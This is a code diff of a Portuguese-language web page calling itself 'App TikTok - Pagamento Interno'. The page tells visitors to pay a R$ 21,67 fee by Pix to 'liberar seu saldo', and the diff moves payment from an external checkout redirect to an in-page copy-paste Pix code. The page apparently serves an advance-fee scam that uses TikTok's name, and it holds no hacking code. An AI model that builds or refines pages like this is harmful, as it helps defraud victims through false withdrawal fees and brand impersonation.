@@ -2,50 +2,64 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Teste LivePix Netlify</title>
+    <title>App TikTok - Pagamento Interno</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background: #010101; color: white; }
-        .btn-pay { background: #ff0050; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        .btn-pay:disabled { background: #555; cursor: not-allowed; }
-        .loader { margin-top: 20px; color: #ff0050; display: none; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #010101; color: white; }
+        .btn-pay { background: #ff0050; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; }
+        .btn-pay:disabled { background: #555; }
+        #pix-area { margin-top: 20px; background: #111; padding: 20px; border-radius: 10px; border: 1px solid #333; display: none; }
+        textarea { width: 100%; height: 80px; background: #000; color: #0f0; border: 1px solid #444; padding: 10px; margin: 10px 0; font-family: monospace; font-size: 12px; }
+        .copy-btn { background: #00f2ea; color: #000; border: none; padding: 10px; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h2>App TikTok - Teste de Saque</h2>
-    <p>Valor da taxa: R$ 21,67</p>
+    <h2>Finalizar Saque</h2>
+    <p>Pague a taxa de R$ 21,67 para liberar seu saldo.</p>
     
-    <button class="btn-pay" id="payBtn">PAGAR TAXA AGORA</button>
-    <div id="loader" class="loader">Gerando pagamento seguro...</div>
+    <button class="btn-pay" id="payBtn">GERAR CÓDIGO PIX</button>
+
+    <div id="pix-area">
+        <p>✅ Pix Gerado com Sucesso!</p>
+        <p style="font-size: 14px; color: #aaa;">Copie o código abaixo e pague no seu banco:</p>
+        <textarea id="pixPayload" readonly></textarea>
+        <button class="copy-btn" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
+        <p style="font-size: 12px; margin-top: 15px;"><a href="#" id="backupLink" target="_blank" style="color: #ff0050;">Problemas? Pagar pelo Checkout</a></p>
+    </div>
 
     <script>
         const payBtn = document.getElementById('payBtn');
-        const loader = document.getElementById('loader');
+        const pixArea = document.getElementById('pix-area');
+        const pixPayload = document.getElementById('pixPayload');
+        const backupLink = document.getElementById('backupLink');
 
-        payBtn.addEventListener('click', async () => {
-            // Feedback visual
-            payBtn.innerText = "PROCESSANDO...";
+        payBtn.onclick = async () => {
+            payBtn.innerText = "GERANDO...";
             payBtn.disabled = true;
-            loader.style.display = "block";
 
             try {
-                const response = await fetch('/.netlify/functions/pix');
-                const data = await response.json();
+                const res = await fetch('/.netlify/functions/pix');
+                const data = await res.json();
 
-                if (data.paymentUrl) {
-                    // Redireciona para o Checkout oficial da LivePix
-                    window.location.href = data.paymentUrl;
+                if (data.pixCopyPaste) {
+                    pixPayload.value = data.pixCopyPaste;
+                    backupLink.href = data.paymentUrl;
+                    pixArea.style.display = "block";
+                    payBtn.style.display = "none"; // Esconde o botão após gerar
                 } else {
-                    throw new Error(data.message || "Erro desconhecido");
+                    alert("Erro ao gerar Pix interno.");
                 }
             } catch (err) {
-                console.error("Erro:", err);
-                alert("Erro ao gerar pagamento: " + err.message);
-                payBtn.innerText = "PAGAR TAXA AGORA";
+                alert("Erro na conexão.");
                 payBtn.disabled = false;
-                loader.style.display = "none";
+                payBtn.innerText = "GERAR CÓDIGO PIX";
             }
-        });
+        };
+
+        function copyPix() {
+            pixPayload.select();
+            document.execCommand('copy');
+            alert("Código Pix copiado!");
+        }
     </script>
 </body>
 </html>
